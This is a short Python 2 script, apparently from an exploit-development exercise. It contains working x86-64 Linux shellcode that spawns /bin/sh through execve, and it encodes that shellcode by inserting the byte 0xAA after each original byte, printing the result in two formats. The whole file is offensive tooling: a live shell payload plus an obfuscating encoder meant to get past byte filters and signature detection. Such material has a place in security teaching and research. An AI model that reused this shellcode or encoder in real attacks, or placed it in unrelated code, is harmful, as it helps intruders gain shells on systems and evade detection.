#!/usr/bin/python


# Fill in the shellcode to be encoded in the 'shellcode' variable

shellcode = ("\xeb\x10\x5f\x57\x48\x89\xe6\x48\x31\xc0\x50\x48\x89\xe2\xb0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")


str1 = ""
str2 = ""


for i in bytearray(shellcode):
	
	str1 += "\\x%02x" %(i)
	str1 += "\\x%02x" %(0xAA)

	str2 += "0x%02x," %(i)
	str2 += "0x%02x," %(0xAA)


print "\n" + str1
print "\n" + str2 + "\n"
print "Length of encoded shellcode is %d" % (len(str1)/4)
